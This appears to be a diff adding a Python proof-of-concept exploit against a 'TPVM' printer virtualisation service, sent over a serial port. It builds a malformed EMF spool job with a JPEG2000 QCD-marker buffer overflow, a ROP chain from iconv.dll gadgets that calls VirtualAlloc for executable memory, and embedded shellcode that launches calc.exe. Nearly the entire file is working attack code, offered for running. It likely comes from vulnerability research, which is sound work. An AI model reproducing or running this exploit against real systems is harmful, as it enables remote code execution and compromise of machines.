@@ -1,0 +1,268 @@
+from ctypes import *
+from ctypes.wintypes import BYTE
+from ctypes.wintypes import WORD
+from ctypes.wintypes import DWORD
+import sys
+import struct
+import binascii
+import array
+import zlib
+
+class DCB(Structure):
+    _fields_=[
+        ('DCBlength',DWORD),
+        ('BaudRate',DWORD),
+        ('fBinary',DWORD,1),
+        ('fParity',DWORD,1),
+        ('fOutxCtsFlow',DWORD,1),
+        ('fOutxDsrFlow',DWORD,1),
+        ('fDtrControl',DWORD,2),
+        ('fDsrSensitivity',DWORD,1),
+        ('fTXContinueOnXoff',DWORD,1),
+        ('fOutX',DWORD,1),
+        ('fInX',DWORD,1),
+        ('fErrorChar',DWORD,1),
+        ('fNull',DWORD,1),
+        ('fRtsControl',DWORD,2),
+        ('fAbortOnError',DWORD,1),
+        ('fDummy2',DWORD,17),
+        ('wReserved',WORD),
+        ('XonLim',WORD),
+        ('XoffLim',WORD),
+        ('ByteSize',BYTE),
+        ('Parity',BYTE),
+        ('StopBits',BYTE),
+        ('XonChar',c_char),
+        ('XoffChar',c_char),
+        ('ErrorChar',c_char),
+        ('EofChar',c_char),
+        ('EvtChar',c_char),
+        ('wReserved1',WORD),
+    ]
+
+class COMMTIMEOUTS(Structure):
+    _fields_=[
+        ('ReadIntervalTimeout',DWORD),
+        ('ReadTotalTimeoutMultiplier',DWORD),
+        ('ReadTotalTimeoutConstant',DWORD),
+        ('WriteTotalTimeoutMultiplier',DWORD),
+        ('WriteTotalTimeoutConstant',DWORD),
+    ]
+
+class TPVM:
+
+    SERIAL_PORT=b'\\\\.\\COM1'
+
+    def __init__(self):
+        self.hPort=windll.kernel32.CreateFileA(self.SERIAL_PORT,
+                                               0xc0000000, #GENERIC_READ|GENERIC_WRITE
+                                               3, #FILE_SHARE_READ|FILE_SHARE_WRITE
+                                               None,
+                                               3, #OPEN_EXISTING
+                                               0,
+                                               None)
+        if (self.hPort&0xffffffff)==0xffffffff:
+            raise Exception('the serial port could not be opened (0x%08x)'%(GetLastError()))
+        if not windll.kernel32.SetupComm(self.hPort,
+                                         0x20000,
+                                         0x84d0):
+            raise WinError()
+        dcb=DCB()
+        dcb.DCBlength=0x1c
+        dcb.BaudRate=0x1C200
+        dcb.fBinary=1
+        dcb.fOutxCtsFlow=1
+        dcb.fDtrControl=2
+        dcb.fRtsControl=2
+        dcb.ByteSize=8
+        dcb.fAbortOnError=1
+        windll.kernel32.SetCommState(self.hPort,
+                                     byref(dcb))
+        commtimeouts=COMMTIMEOUTS()
+        commtimeouts.ReadIntervalTimeout=0
+        commtimeouts.ReadTotalTimeoutMultiplier=0
+        commtimeouts.ReadTotalTimeoutConstant=20000
+        commtimeouts.WriteTotalTimeoutMultiplier=0
+        commtimeouts.WriteTotalTimeoutConstant=20000
+        if not windll.kernel32.SetCommTimeouts(self.hPort,
+                                               byref(commtimeouts)):
+            raise WinError()
+
+    def __write_packet(self,buffer):
+        bytesWritten=DWORD(0)
+        if not windll.kernel32.WriteFile(self.hPort,
+                                         buffer,
+                                         len(buffer),
+                                         byref(bytesWritten),
+                                         None):
+            raise WinError()
+        print('%d bytes written'%(bytesWritten.value))
+
+    def __read_packet(self,n):
+        buffer=c_buffer(n)
+        bytesRead=DWORD(0)
+        if not windll.kernel32.ReadFile(self.hPort,
+                                        buffer,
+                                        n,
+                                        byref(bytesRead),
+                                        None):
+            raise WinError()
+        print('%d bytes read'%(bytesRead.value))
+        return buffer.raw
+
+    def __write(self,buffer):
+        while len(buffer)!=0:
+            n=min(len(buffer),0x7ffd)
+            self.__write_packet(struct.pack('<H',n)+buffer[:n])
+            buffer=buffer[n:]
+
+    def __read_1byte(self):
+        b=self.__read_packet(1)
+        if len(b)!=1:
+            return 1
+        return struct.unpack('<B',b)[0]
+
+    def do_command(self,cmd):
+        self.__write_packet(struct.pack('<H',cmd))
+        if cmd==0x8002:
+            return 0
+        return self.__read_1byte()
+
+    def do_data(self,d):
+        self.__write(d)
+        return self.__read_1byte()
+
+    def close(self):
+        windll.kernel32.CloseHandle(self.hPort)
+
+def main(args):
+    #some constants
+    PRINTER_ID=1 #should probably be an argument really
+    SHELLCODE=binascii.a2b_hex('e8000000005b8db31b010000568db313010000566a0268884e0d00e8170000006a008d832301000050ff931b0100006a00ff931f0100005589e55156578b4d0c8b75108b7d14ff36ff7508e813000000890783c70483c604e2ec5f5e5989ec5dc210005589e55356575164ff3530000000588b400c8b480c8b118b41306a028b7d085750e85b00000085c0740489d1ebe78b4118508b583c01d88b5878585001c38b4b1c8b53208b5b2401c101c201c38b32585001c66a01ff750c56e82300000085c0740883c20483c302ebe35831d2668b13c1e20201d10301595f5e5b89ec5dc208005589e551535231c931db31d28b45088a1080ca6001d3d1e30345108a0884c9e0ee31c08b4d0c39cb7401405a5b5989ec5dc20c00ea6f0000945d0300000000000000000063616c632e65786500') #Didier Stevens' winexec/exitthread
+    WRITABLE=0x1010ff00 #end of the .idata section of iconv.dll
+    BASE=0x40000000 #where we want the virtualalloc
+
+    t=TPVM()
+    t.do_command(0x8001)
+    #header
+    t.do_data(struct.pack('<20sIIII',('%d'%(PRINTER_ID)).encode('utf-8'),2,0xd,0,0))
+    #jobheader
+    t.do_data(binascii.a2b_hex('310001001400150016001700180021002f0030000000000063727970746f61640050494e42414c4c57495a415244000000'))
+
+    ###############
+    #emf
+    emf=b''
+    #emr_header
+    emf+=struct.pack('<II',1,0x84)
+    emf+=struct.pack('<IIII',0xf1,0xf2,0x130b,0x1855) #bounds
+    emf+=struct.pack('<IIII',0,0,0x53fc,0x6cfc) #frame
+    emf+=b' EMF' #record signature
+    emf+=struct.pack('<I',0x10000) #version
+    emf+=struct.pack('<IIHH',0,0,0,0) #bytes,records,handles,reserved
+    emf+=struct.pack('<II',0xc,0x6c) #ndescription,offdescription
+    emf+=struct.pack('<I',0) #npalentries
+    emf+=struct.pack('<II',0x13ec,0x19c8) #device
+    emf+=struct.pack('<II',0xd7,0x117) #millimeters
+    emf+=struct.pack('<III',0,0,1) #cbpixelformat,offpixelformat,bopengl
+    emf+=struct.pack('<II',0x347d8,0x441d8) #micrometersx,micrometersy
+    emf+=('\0'*0xc).encode('utf-16le')
+    #overflowing buffer
+    o=b''
+    o+=struct.pack('<I',0x1001c94c) #mov eax,edx&retn
+    o+=struct.pack('<I',0x10110284) #target --.idata!_iob_func
+    o+=struct.pack('<I',0x1001c594) #value --pop ecx&pop ecx&retn
+    o+=struct.pack('<I',0x100010b1) #mov ebp,esp&push ecx& call ds:_iob_func
+    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
+    o+=struct.pack('<I',0x1001c594) #pop ecx&pop ecx&retn
+    o+=struct.pack('<I',0x1000cb5c) #dec eax&retn
+    o+=struct.pack('<I',0x10003d43) #add [eax+1],edi&mov esp,ebp&pop ebp&retn
+    o+=struct.pack('<I',0x10001116) #pop ebp&retn
+    o+=struct.pack('<I',WRITABLE-8)
+    o+=struct.pack('<I',0x1001c120) #mov eax,[ebp+8]&pop ebp&retn
+    o+=struct.pack('<I',0x41414141) #
+    o+=struct.pack('<I',0x100010b1) #mov ebp,esp&push ecx& call ds:_iob_func
+    o+=struct.pack('<I',0x1001c595) #pop ecx&pop ecx&retn
+    o+=struct.pack('<I',0x1001c594) #pop ecx&pop ecx&retn
+    o+=struct.pack('<I',0x1001c1fc) #mov eax,[eax]&mov [esp],eax&retn
+    o+=struct.pack('<I',0x42424242) #
+    o+=struct.pack('<I',0x1001c7d6) #pop edi&pop esi&retn
+    o+=struct.pack('<I',BASE)
+    o+=struct.pack('<I',0x10000)
+    o+=struct.pack('<I',0x3000) #MEM_COMMIT|MEM_RESERVE
+    o+=struct.pack('<I',0x40) #PAGE_READWRITE_EXECUTE
+    o+=struct.pack('<I',BASE+0x10) #edi
+    o+=struct.pack('<I',0x43434343) #esi --not used
+    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
+    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
+    o+=struct.pack('<I',BASE) #
+    o+=struct.pack('<I',0x8b24438b) #
+    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
+    o+=struct.pack('<I',BASE+4) #
+    o+=struct.pack('<I',0xa4f21470) #
+    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
+    o+=struct.pack('<I',BASE+8) #
+    o+=struct.pack('<I',0x01f3e9) #mov eax,[ebx+0x24]&mov esi,[eax+0x14]&jmp +0x13f
+    o+=struct.pack('<I',0x1000) #ecx
+    o+=struct.pack('<I',BASE) #
+    ###print('len(o)=0x%08x'%(len(o))) #must be <0xc4
+    o+=b'A'*(0xc4-len(o))
+    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange --first eip
+    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
+    o+=struct.pack('<I',WRITABLE) #target
+    o+=struct.pack('<I',0x000000f4) #value --esp offset
+    o+=struct.pack('<I',WRITABLE) #writable --edx
+    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
+    o+=struct.pack('<I',0x7fffffff) #
+    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
+    o+=struct.pack('<I',0x1001c1e0) #__alloca_probe
+    o+=struct.pack('<I',WRITABLE) #target
+    o+=struct.pack('<I',0x00078c48) #.idata!VirtualAlloc-@edi
+    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
+    o+=b'C'*100
+    while (len(o)-2)%6!=0: #padding to satisfy length requirements
+        o+=b'Z'
+    #jp2 contents --the code still parses the codestream if no valid header is present, so I skipped it
+    j=b''
+    j+=struct.pack('>H',0xff4f) #SOC marker
+    j+=struct.pack('>HH',0xff51,0x29) #SIZ marker
+    j+=struct.pack('>HIIIIIIII',0,1,9,0,0,1,9,0,0)
+    j+=struct.pack('>HBBB',1,7,1,1)
+    j+=struct.pack('>HH',0xff5c,3+len(o)) #QCD marker
+    j+=struct.pack('>B',2) #sqcd
+    for i in range(0,len(o),2): #switch the endianness of the words
+        j+=struct.pack('>H',(o[i+1]<<8)+o[i])
+    j+=struct.pack('>H',0xffd9) #EOC marker
+    j+=b'\x90'*(0x200-len(j)) #unprocessed data
+    j+=SHELLCODE
+    j+=b'\xcc'*(0x10000-len(j)) #has to be at least 10000h long to avoid a read AV
+    #custom 8000h record
+    r=b''
+    r+=b'A'*0x28
+    r+=struct.pack('<I',0x50)
+    r+=b'B'*0x1c
+    r+=struct.pack('<IIII',0x43434343,0x10,0x10,0x44444444)
+    r+=b'E'*0x18
+    r+=j
+    emf+=struct.pack('<II',0x8000,len(r)+8)+r #type,size
+    #emr_eof
+    emf+=struct.pack('<IIIII',0xe,0x14,0,0x10,0x14)
+    emf=emf[:0x30]+struct.pack('<IIH',len(emf),3,1)+emf[0x3a:]
+    #devmode
+    dm=binascii.a2b_hex('7000720069006e00740065007200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001040005dc0008040fff010001000100de0a66086400010007005802020001005802010001004c006500740074006500720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000545045580f020000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000010110141e000e1464000614f401060f00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005450504405000000')
+    dm=b'%%EMF'+struct.pack('<BI',2,len(dm)+5)+dm
+    #emf_spool
+    h=struct.pack('<II',0x10,0)+'Google\0'.encode('utf-16le')+struct.pack('<HII',0xdead,0xc,len(emf))
+    h=struct.pack('<II',0x10000,len(h))+h
+    #emri_metafile_ext
+    f=struct.pack('<IIII',0xd,8,len(emf)+8,0) #"offset is counted backward"
+    e=dm+h+emf+f
+    d=zlib.compress(e,9)
+    d=struct.pack('<II',len(d),len(e))+d
+    d=struct.pack('<H',0)+d
+    ###############
+    t.do_data(d)
+    t.do_command(0x8002)
+    t.close()
+
+if __name__=='__main__':
+    main(sys.argv)
